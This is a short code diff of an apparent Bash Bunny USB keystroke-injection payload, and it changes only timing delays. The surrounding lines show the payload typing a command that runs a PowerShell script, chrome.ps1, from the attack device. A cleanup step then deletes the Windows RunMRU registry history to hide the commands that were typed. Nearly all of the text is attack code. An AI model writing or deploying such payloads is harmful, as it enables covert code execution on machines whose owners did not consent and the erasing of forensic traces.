@@ -32,7 +32,7 @@ Q DELAY 750
 LED STAGE3
 Q STRING ".((gwmi win32_volume -f 'label=''BashBunny''').Name+'payloads\\$SWITCH_POSITION\chrome.ps1')"
 Q ENTER
-Q DELAY 1500
+Q DELAY 5000
 
 #Cleanup and revert
 LED CLEANUP
@@ -41,7 +41,7 @@ Q ENTER
 Q DELAY 1000
 Q STRING A
 Q ENTER
-Q DELAY 1500
+Q DELAY 1000
 Q STRING powershell "Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -ErrorAction SilentlyContinue"
 Q ENTER
 Q DELAY 1250
